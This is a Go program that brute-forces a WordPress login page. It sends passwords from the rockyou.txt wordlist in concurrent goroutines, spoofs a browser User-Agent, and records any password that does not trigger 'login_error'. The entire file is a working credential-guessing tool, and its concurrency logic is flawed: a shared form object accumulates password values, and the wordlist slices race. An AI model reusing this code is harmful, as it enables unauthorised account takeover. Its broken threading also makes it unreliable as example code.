package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Attack struct {
	client		*http.Client
	password	string
	values		*url.Values
	objName		string
	startTime	*time.Time
}

func main() {
	/**! Creating some fucking important variables !**/
	var (
		threads int 	= 10
		timeOut time.Duration 	= 60 // seconds
		wg 			  	sync.WaitGroup
		client 		  	*http.Client
		userName string = "naruko"
		objName 		= "https://sandbox.narukoshin.me/wordpress/wp-login.php"
		values  		= url.Values{}
		wordlist		= "rockyou.txt"
		startTime		= time.Now()
	)

	/**! Reading the fucking wordlist !**/
	wlist, err := LoadWordlist(wordlist)
	if err != nil {
		log.Fatal(err)
	}

	// Reading the password count in the wordlist
	wlen := len(wlist)

	/**! Preparing the request !**/

	// Setting up the candies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatal(err)
	}

	// Setting up the client
	client = &http.Client {
		Jar: jar,
		Timeout: timeOut * time.Second,
	}

	// Adding the fucking username to the values
	values.Add("log", userName)

	/**! Doing some shitty stuff with our code !**/
	for i := 1; i <= threads; i++ {
		wg.Add(1)
		go func(){
			defer wg.Done()
				/**! Reading the fucking passwords !**/
				passwords := wlist[:wlen/threads]
				wlist 	   = wlist[wlen/threads:]


				wg.Add(2)

				// First thread
				go func(){
					defer wg.Done()
					for _, pw := range wlist {
						attack := Attack {
							client: client,
							 password: pw,
							 values: &values,
							 objName: objName,
							 startTime: &startTime,
						}
						attack.StartAttack()
					}
				}()

				// Second thread
				go func(){
					defer wg.Done()
					for _, pw := range passwords {
						attack := Attack {
							client: client,
							 password: pw,
							 values: &values,
							 objName: objName,
							 startTime: &startTime,
						}
						attack.StartAttack()
					}
				}()
			}()
	}
	wg.Wait()
	fmt.Println(time.Since(startTime))
}

func (a Attack) StartAttack(){
	defer func(){
		if err := recover(); err != nil {
			log.Printf("panic: %+v", err)
		}
	}()

	// Setting the fucking passwords for the request
	a.values.Add("pwd", strings.TrimSpace(a.password))

	// Preparing the fucking request for the job
	req, _ := http.NewRequest(http.MethodPost, a.objName, strings.NewReader(a.values.Encode()))
	defer req.Body.Close()

	// Setting necessary headers for successful request
	// User-Agent
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; en-MT) AppleWebKit/602.3.3 (KHTML, like Gecko) Version/12.0.2 Safari/602.3.3")

	// Content-Type
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded;charset=utf-8")

	// Executing the fucking request
	resp, err := a.client.Do(req)
	if err != nil {
		//log.Println(err.Error())
		return
	}
	defer resp.Body.Close()

	// If response is successfuly then reading the response
	if resp.StatusCode == 200 {
		// Reading the response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}

		// Searching for the login_error in the response body
		if !strings.Contains(string(body), "login_error"){
			ActionPasswordFound(a.password)
		} else {
			fmt.Println(a.password)
		}
	}
}

/**! Writing down the password in seperate file !**/
func ActionPasswordFound(password string){
	file, err := os.OpenFile("result", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	file.Write([]byte(password + "\n"))
	os.Exit(1)
}

/**! Loading passwords from the wordlist !**/
func LoadWordlist(wordlist string) (contents []string, err error){
	// Reading the wordlist
	file, err := ioutil.ReadFile(wordlist)

	// Splitting the wordlist to access the list of passwords
	contents = strings.Split(string(file), "\n")
	return
}